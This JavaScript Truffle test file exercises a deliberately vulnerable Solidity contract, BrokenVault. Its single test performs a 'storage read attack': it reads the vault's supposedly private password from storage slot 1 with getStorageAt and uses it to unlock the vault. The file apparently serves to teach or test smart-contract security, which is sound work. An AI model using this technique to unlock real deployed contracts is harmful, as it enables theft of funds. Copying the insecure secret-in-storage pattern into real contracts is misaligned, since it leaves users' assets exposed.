"use strict";

// Import the third-party libraries
const promise = require("bluebird");

// Import the local libraries and customize the web3 environment
const addEvmFunctions = require("../utils/evmFunctions.js");

addEvmFunctions(web3);

if (typeof web3.eth.getBlockPromise !== "function") {
    promise.promisifyAll(web3.eth, { suffix: "Promise" });
}
if (typeof web3.evm.increaseTimePromise !== "function") {
    promise.promisifyAll(web3.evm, { suffix: "Promise" });
}
if (typeof web3.version.getNodePromise !== "function") {
    promise.promisifyAll(web3.version, { suffix: "Promise" });
}

web3.eth.getTransactionReceiptMined = require("../utils/getTransactionReceiptMined.js");
web3.eth.makeSureHasAtLeast = require("../utils/makeSureHasAtLeast.js");
web3.eth.makeSureAreUnlocked = require("../utils/makeSureAreUnlocked.js");

const BigNumber = web3.BigNumber;
const should = require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(BigNumber))
    .should();

const chai = require("chai");
const chaiAsPromised = require("chai-as-promised");
chai.use(chaiAsPromised);

const assert = chai.assert;

// Import the smart contracts
const BrokenVault = artifacts.require("BrokenVault");

// Contract unit and interation tests
contract("BrokenVault", function(accounts) {
    const MAX_GAS               = 2900000;
    const TESTRPC_SLOW_DURATION = 5300;
    const GETH_SLOW_DURATION    = 15000;

    let node, isTestRPC, isGeth, slowDuration;
    before("identifying node", async function() {
        node = await web3.version.getNodePromise();
        isTestRPC = await node.indexOf("EthereumJS TestRPC") >= 0;
        isGeth = await node.indexOf("Geth") >= 0;
        slowDuration = isTestRPC ? TESTRPC_SLOW_DURATION : GETH_SLOW_DURATION;
    });

    let coinbase, owner, user1;
    before("checking accounts", async function() {
        assert.isAtLeast(accounts.length, 3, "not enough accounts");

        coinbase = await web3.eth.getCoinbasePromise();

        // Coinbase gets the rewards, making calculations difficult.
        const coinbaseIndex = await  accounts.indexOf(coinbase);
        // Remove the actual account
        if (coinbaseIndex > -1) {
            accounts.splice(coinbaseIndex, 1);
        }
        [owner, user1] = accounts;

        await web3.eth.makeSureAreUnlocked(accounts);
        const txObj = await web3.eth.makeSureHasAtLeast(coinbase, [owner, user1], web3.toWei(1, 'ether'));
        await web3.eth.getTransactionReceiptMined(txObj);
    });

    describe("#storage read attack", async function() {
        it("should unlock the vault just knowing the deployment address", async function() {
            this.slow(slowDuration);

            const vault = await BrokenVault.new({ from: owner, gas: MAX_GAS });

            var locked = await vault.locked();
            assert.isTrue(locked, "vault locked state variable is false");
            locked = await web3.eth.getStorageAt(vault.address, 0);
            assert.strictEqual(parseInt(locked, 16), 1, "vault locked state variable is false");

            const password = await web3.eth.getStorageAt(vault.address, 1);
            await vault.unlock(web3.toAscii(password), { from: owner, gas: MAX_GAS });

            locked = await vault.locked();
            assert.isFalse(locked, "vault locked state variable is true");
            locked = await web3.eth.getStorageAt(vault.address, 0);
            assert.strictEqual(parseInt(locked, 16), 0, "vault locked state variable is true");
        });
    });
});